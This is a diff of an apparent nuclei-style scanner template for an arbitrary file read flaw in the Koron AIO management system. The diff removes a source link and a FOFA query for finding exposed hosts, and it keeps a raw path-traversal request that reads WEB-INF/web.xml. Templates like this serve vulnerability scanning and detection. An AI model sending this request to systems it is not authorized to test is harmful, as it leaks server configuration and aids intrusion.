@@ -3,12 +3,8 @@ info:
   name: 科荣 AIO 管理系统 ReadFile 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/supmdlb76xig8lt4'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: supmdlb76xig8lt4
-    fofa: body="changeAccount('8000')" || body="changeAccount(\"varAccount\")"|| body="KoronCom.TrustedSites"
 http:
 - raw:
   - 'GET /ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml HTTP/1.1
